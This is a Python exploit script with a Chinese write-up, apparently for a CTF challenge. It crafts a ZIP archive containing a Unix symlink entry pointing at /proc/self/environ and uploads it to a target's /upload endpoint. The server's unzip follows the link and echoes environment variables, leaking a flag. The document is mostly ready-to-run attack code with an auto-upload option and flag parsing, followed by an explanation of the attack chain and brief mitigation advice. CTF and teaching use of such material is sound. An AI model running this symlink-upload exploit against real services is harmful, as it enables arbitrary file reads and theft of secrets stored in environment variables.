import zipfile, io, urllib.request, ssl, sys

TARGET = "https://85614ef6b3a219e82468281a.http-ctf2.dasctf.com"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE

def mkzip_symlink(name, target):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
        zi = zipfile.ZipInfo(name)
        zi.create_system = 3
        '''
        #  Unix 系统标记（关键！）ZIP 格式里有个字段记录「这个条目是哪个系统创建的」。
        # 0 = DOS/Windows，3 = Unix。这一步很关键：它告诉解压工具（unzip）「请用 Unix 的方式去理解下面那个 external_attr 字段」。
        # 如果漏掉这行，默认是 Windows(0)，unzip 就不会把它当成 Unix 符号链接，只会把目标路径当普通文件内容写入——这正是我们之前踩的坑。
        '''
        zi.external_attr = (0o120777) << 16
        '''
        external_attr 是 ZIP 条目头里的「外部属性」字段（32 位）。在 Unix 约定下，它的高 16 位存放文件的 st_mode（文件类型和权限）。
        0o120777 拆开看：
        0o120000 = S_IFLNK，即「符号链接」类型位（st_mode 的高 4 位）；
        0o777 = 权限位 rwxrwxrwx（链接本身的权限，一般给满）；
        合起来 0o120777 的意思就是：这是一个符号链接，权限 777。
        << 16 是把这个模式值移到 external_attr 的高 16 位，符合 Unix 在 ZIP 里的存放约定。
        '''
        z.writestr(zi, target)                #对普通文件，第二个参数是「文件内容」；但对符号链接，第二个参数是「链接指向的目标路径字符串」——也就是 /proc/self/environ。
                                              # 链接文件本身不存数据，只存这个路径。所以这里 target 写的是被指向的文件，而非任何数据。
    return buf.getvalue()

def upload(data):
    boundary = "----WebKitFormBoundaryABC123"
    body  = (f"--{boundary}\r\n").encode()
    body += (b'Content-Disposition: form-data; name="the_file"; filename="x.zip"\r\n')
    body += (b"Content-Type: application/zip\r\n\r\n")
    body += data + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    req = urllib.request.Request(TARGET + "/upload", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    return urllib.request.urlopen(req, timeout=25, context=CTX).read().decode('utf-8', 'replace')

def main():
    # 用法:
    #   python exploit_zip_symlink.py                  -> 保存 x.zip 到本地 (默认目标 /proc/self/environ)
    #   python exploit_zip_symlink.py <target>        -> 保存 x.zip 到本地, 符号链接指向 <target>
    #   python exploit_zip_symlink.py <target> --upload -> 直接构造并上传(自动发请求)
    target = "/proc/self/environ"
    do_upload = False
    args = sys.argv[1:]
    if args and args[0] in ("--upload", "-u"):
        do_upload = True
        args = args[1:]
    elif len(args) >= 2 and args[-1] in ("--upload", "-u"):
        do_upload = True
        args = args[:-1]
    if args:
        target = args[0]

    zip_bytes = mkzip_symlink("env", target)
    out_name = "exploit.zip"

    if do_upload:
        # 兼容旧行为: 直接上传远程
        raw = upload(zip_bytes)
        if "FLAG" in raw:
            for e in raw.split("\x00"):
                if "FLAG" in e:
                    print("[+] FLAG found:", e)
        else:
            print(raw[:1500])
    else:
        # 默认: 保存到本地文件, 供手动通过网页表单上传
        with open(out_name, "wb") as f:
            f.write(zip_bytes)
        print(f"[+] 已保存符号链接 ZIP 到本地: {out_name}")
        print(f"    条目 env -> {target}")
        print(f"    通过浏览器访问 {TARGET}/upload 手动上传该文件即可触发利用。")

if __name__ == "__main__":
    main()
'''
ctf2
babypython[国赛总决赛复现]
二、攻击链（对应上图）
① 构造恶意 ZIP
ZIP 里放一个特殊条目，文件名叫 env，但它不是普通文件，而是一个符号链接（symlink），指向 /proc/self/environ。

② 上传到 /upload
服务器拿到 ZIP 后调用系统 unzip 解压。关键在于：unzip 默认会还原 ZIP 里记录的「符号链接」条目，在解压目录里创建一个真正的软链接文件 env -> /proc/self/environ，而不是把目标路径当字符串写进去。

③ 服务器读取并回显文件内容
/upload 的逻辑是「把解压目录里的文件内容读出来拼进 HTTP 响应」。当它读到 env 这个文件时，操作系统层面 open("env") 会透明地跟随符号链接，实际打开的是 /proc/self/environ。

④ 泄漏 FLAG
/proc/self/environ 是当前进程的所有环境变量，以 \x00 分隔。题目把 flag 放在了环境变量里：FLAG=CTF2{0f90016d-0285-4165-ad09-48dde49130e1}。于是响应里就带出了 flag。

一句话概括：上传伪造的符号链接 → 服务器解压成真链接 → 读取时跟随链接读到 /proc/self/environ → 环境变量里的 FLAG 被回显。

三、为什么是 /proc/self/environ
/proc/self/environ 是 Linux 的 proc 文件系统接口，内容是「当前进程」的环境变量。它有两个好处：

路径固定、任何权限的进程都能读自己的 environ；
运维/开发者常把 flag、密钥直接塞进环境变量（而不是写进文件），所以这里极容易挖到敏感信息。本题的 PWD=/app/y0u_found_it、PYTHONPATH=/app 也都在里面，间接暴露了源码位置。
四、最关键的坑：Python 构造 ZIP 时的「符号链接陷阱」
这是实战里最容易翻车的地方。用 Python 的 zipfile 模块写符号链接时，默认构造出来的 ZIP 不会让 unzip 识别成符号链接，导致回显的只是目标路径字符串 /proc/self/environ，而不是文件内容。

原因：zipfile 记录的条目元信息里有个 create_system 字段，默认是 0（Windows/dos）。unzip 看到非 Unix 系统标记，就不会按 Unix 符号链接去还原。必须显式设成 Unix：

python
zi = zipfile.ZipInfo("env")
zi.create_system = 3                     # Unix 系统标记（关键！）
zi.external_attr = (0o120777) << 16      # 文件模式 = S_IFLNK | 0777
z.writestr(zi, "/proc/self/environ")     # 写的是「链接目标路径」不是内容
另外要用 ZIP_STORED（不压缩）——符号链接本身没有可压缩的「内容」，压缩反而可能干扰 unzip 对链接类型的判断。三项都设对后，unzip 才会生成真实软链接，读取时成功跟随。

五、为什么「Zip Slip / 符号链接」本身也算漏洞
正常安全的做法是：解压不可信 ZIP 时应当禁用符号链接还原（如 unzip -K 不要、或用 zipfile 解压时跳过非普通文件），且解压目录应禁止跟随符号链接、与敏感路径隔离。本题服务器直接用 unzip 且允许符号链接，等于把「读取任意文件」的能力交给了上传者——这是典型的**任意文件读取（通过符号链接）**漏洞。
'''